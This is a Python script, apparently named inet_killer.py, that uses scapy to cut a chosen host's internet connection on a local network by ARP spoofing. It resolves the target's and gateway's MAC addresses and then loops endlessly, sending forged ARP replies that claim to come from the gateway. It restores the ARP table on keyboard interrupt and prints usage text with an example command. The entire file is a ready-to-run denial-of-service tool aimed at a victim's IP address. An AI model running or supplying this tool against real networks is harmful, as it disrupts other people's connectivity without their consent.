#!/usr/bin/env python3
from scapy.all import *
import sys

def get_mac(ip_address):

	# send arp request and receive apr reply
	answer, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2, retry=10)

	# Return the mac address
	for s, r in answer :
		return r[Ether].src

	return None

def restore_target(target_ip, target_mac, gateway_ip, gateway_mac):
	'''
	stop poising attack and return normal state
	by sending the right arp packet to each one (target and gateway)

	operation code : 1 for request, 2 for reply
	'''

	send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff'), count=5)


def inet_killer(target_ip, target_mac, gateway_ip, gateway_mac):
	'''
	kill internet connectio for target by arp spoofing
	'''

	# create arp packet to send to target, saying we are the gateway
	poison_target = ARP()
	poison_target.op = 2 # is-at reply
	poison_target.psrc = gateway_ip # saying the packet came from gateway, our hdsrc(hardware source ) will be inlcuded auto
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac

	# send packets
	while True :
		try :
			send(poison_target)

		except KeyboardInterrupt:
			print("\nrestoring target....")
			restore_target(target_ip, target_mac, gateway_ip, gateway_mac)
			exit()

	return

def usage():
	print(" inet_killer : internet connection killer\n")
	print(" usage : sudo python3 inet_killer.py [target] [gateway] [interface]")

	print("\n Options :")
	print("\t target : your target ip address\n")
	print("\t gateway : your gateway ip address\n")
	print("\t interface : your network interface\n")

	print("\n Example : sudo python3 inet_killer.py 192.168.1.156 192.168.1.1 wlan0\n")

def main(target, gateway, interface):

	# scapy verbose mode set to 0
	conf.iface = interface
	conf.verb = 0 

	print("[*] setting up interface ...")
	
	target_ip = target
	gateway_ip = gateway
	target_mac = get_mac(target_ip)
	gateway_mac = get_mac(gateway_ip)

	# check target and gateway MAC
	if target_mac == None :
		print("[-] Failed to resolve target {} mac address.".format(target_ip, target_mac))
		exit()
	else :
		print("[+]Target {} is at {}".format(target_ip, target_mac))

	if gateway_mac == None :
		print("[-] Failed to resolve Gateway {} mac address ". format(gateway_ip))
		exit()
	else :
		print("[-] Gateway {} is at {}".format(gateway_ip, gateway_mac))

	print("[*] killing connection for {}  ...".format(target_ip))
	inet_killer(target_ip, target_mac, gateway_ip, gateway_mac)

if __name__ == '__main__':
	if len(sys.argv[1:]) == 3:
		main(sys.argv[1], sys.argv[2], sys.argv[3])
	else :
		usage()